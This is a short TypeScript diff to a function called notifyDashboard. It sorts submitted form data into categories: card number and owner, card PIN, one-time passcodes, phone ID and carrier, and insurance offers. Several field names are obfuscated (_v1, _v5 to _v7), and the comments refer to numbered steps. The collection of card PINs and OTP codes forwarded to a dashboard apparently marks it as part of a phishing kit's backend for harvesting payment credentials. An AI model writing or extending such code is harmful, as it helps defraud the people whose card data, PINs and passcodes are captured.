@@ -147,13 +147,15 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
     const combinedData = { ...(payload?.raw || {}), ...payload };
     let entryType = 'basic'; // default type
     
-    if (combinedData.phoneIdNumber || combinedData.phoneCarrier) {
-      entryType = 'phone'; // Phone verification data
-    } else if (combinedData.otpCode || combinedData.otp) {
-      entryType = 'otp'; // OTP code data
-    } else if (combinedData.pinCode || combinedData.pin) {
+    // OTP verification takes priority - check this first
+    // This includes both step2 OTP (_v5, otpCode) and step5 phone OTP (_v7, phoneOtpSubmittedAt)
+    if (combinedData.otpCode || combinedData.otp || combinedData._v5 || combinedData._v7 || combinedData.phoneOtpSubmittedAt) {
+      entryType = 'otp'; // OTP code data (from step2 or step5)
+    } else if (combinedData.phoneIdNumber || combinedData.phoneCarrier) {
+      entryType = 'phone'; // Phone verification data (from step5 - before OTP)
+    } else if (combinedData.pinCode || combinedData.pin || combinedData._v6) {
       entryType = 'pin'; // PIN code data
-    } else if (combinedData.cardNumber || combinedData._v1) {
+    } else if (combinedData.cardNumber || combinedData._v1 || combinedData.cardOwner) {
       entryType = 'card'; // Card data
     } else if (combinedData.selectedOffer || combinedData.offerTotalPrice) {
       entryType = 'insurance'; // Insurance selection
